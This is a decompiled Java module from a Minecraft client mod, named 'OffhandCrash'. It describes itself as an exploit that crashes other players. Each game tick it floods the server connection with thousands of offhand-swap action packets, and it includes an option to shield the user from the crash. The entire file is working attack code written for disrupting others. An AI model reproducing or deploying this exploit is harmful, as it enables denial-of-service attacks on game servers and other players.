/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  io.netty.channel.Channel
 *  net.minecraft.class_2338
 *  net.minecraft.class_2350
 *  net.minecraft.class_2846
 *  net.minecraft.class_2846$class_2847
 */
package minegame159.meteorclient.systems.modules.player;

import io.netty.channel.Channel;
import meteordevelopment.orbit.EventHandler;
import minegame159.meteorclient.events.world.TickEvent;
import minegame159.meteorclient.mixin.ClientConnectionAccessor;
import minegame159.meteorclient.settings.BoolSetting;
import minegame159.meteorclient.settings.IntSetting;
import minegame159.meteorclient.settings.Setting;
import minegame159.meteorclient.settings.SettingGroup;
import minegame159.meteorclient.systems.modules.Categories;
import minegame159.meteorclient.systems.modules.Module;
import net.minecraft.class_2338;
import net.minecraft.class_2350;
import net.minecraft.class_2846;

public class OffhandCrash
extends Module {
    private static final /* synthetic */ class_2846 PACKET;
    private final /* synthetic */ SettingGroup sgGeneral;
    private final /* synthetic */ Setting<Integer> speed;
    private final /* synthetic */ Setting<Boolean> doCrash;
    private final /* synthetic */ Setting<Boolean> antiCrash;

    static {
        PACKET = new class_2846(class_2846.class_2847.field_12969, new class_2338(0, 0, 0), class_2350.field_11036);
    }

    public OffhandCrash() {
        super(Categories.Misc, "offhand-crash", "An exploit that can crash other players by swapping back and forth between your main hand and offhand.");
        OffhandCrash llIIIlIIllIlI;
        llIIIlIIllIlI.sgGeneral = llIIIlIIllIlI.settings.getDefaultGroup();
        llIIIlIIllIlI.doCrash = llIIIlIIllIlI.sgGeneral.add(new BoolSetting.Builder().name("do-crash").description("Sends X number of offhand swap sound packets to the server per tick.").defaultValue(true).build());
        llIIIlIIllIlI.speed = llIIIlIIllIlI.sgGeneral.add(new IntSetting.Builder().name("speed").description("The amount of swaps measured in ticks.").defaultValue(2000).min(1).sliderMax(10000).visible(llIIIlIIllIlI.doCrash::get).build());
        llIIIlIIllIlI.antiCrash = llIIIlIIllIlI.sgGeneral.add(new BoolSetting.Builder().name("anti-crash").description("Attempts to prevent you from crashing yourself.").defaultValue(true).build());
    }

    @EventHandler
    private void onTick(TickEvent.Post llIIIlIIlIIlI) {
        OffhandCrash llIIIlIIlIIll;
        if (llIIIlIIlIIll.doCrash.get().booleanValue()) {
            Channel llIIIlIIlIlII = ((ClientConnectionAccessor)llIIIlIIlIIll.mc.field_1724.field_3944.method_2872()).getChannel();
            for (int llIIIlIIlIlIl = 0; llIIIlIIlIlIl < llIIIlIIlIIll.speed.get(); ++llIIIlIIlIlIl) {
                llIIIlIIlIlII.write((Object)PACKET);
            }
            llIIIlIIlIlII.flush();
        }
    }

    public boolean isAntiCrash() {
        OffhandCrash llIIIlIIIllIl;
        return llIIIlIIIllIl.isActive() && llIIIlIIIllIl.antiCrash.get() != false;
    }
}

